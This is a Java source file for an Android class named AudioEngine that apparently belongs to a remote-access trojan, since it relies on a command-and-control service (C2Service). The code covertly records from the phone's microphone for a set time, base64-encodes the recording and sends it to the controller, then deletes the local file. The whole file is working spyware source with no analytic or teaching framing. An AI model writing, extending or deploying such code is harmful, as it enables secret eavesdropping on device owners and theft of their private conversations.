package com.wuzenx.engine;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import com.wuzenx.C2Service;
import java.io.File;
import java.io.FileInputStream;

public class AudioEngine {
    private Context context;
    private C2Service c2;
    private MediaRecorder recorder = null;
    private Handler handler = new Handler(Looper.getMainLooper());

    public AudioEngine(Context context, C2Service c2) { this.context = context; this.c2 = c2; }

    public void startRecording(int seconds) {
        try {
            File output = new File(Environment.getExternalStorageDirectory(), "wuzenx_audio.3gp");
            if (output.exists()) output.delete();
            
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(output.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            
            c2.sendMessage("log", "Recording audio for " + seconds + "s...");
            
            handler.postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();
                    recorder = null;
                    
                    FileInputStream fis = new FileInputStream(output);
                    byte[] data = new byte[(int) output.length()];
                    fis.read(data);
                    fis.close();
                    
                    String b64 = android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP);
                    c2.sendMessage("log", "AUDIO_RECORDING:" + b64);
                    output.delete();
                    c2.sendMessage("log", "Audio recording complete (" + seconds + "s)");
                } catch (Exception e) {
                    c2.sendMessage("log", "Audio error: " + e.getMessage());
                }
            }, seconds * 1000L);
        } catch (Exception e) {
            c2.sendMessage("log", "Audio start error: " + e.getMessage());
        }
    }
}
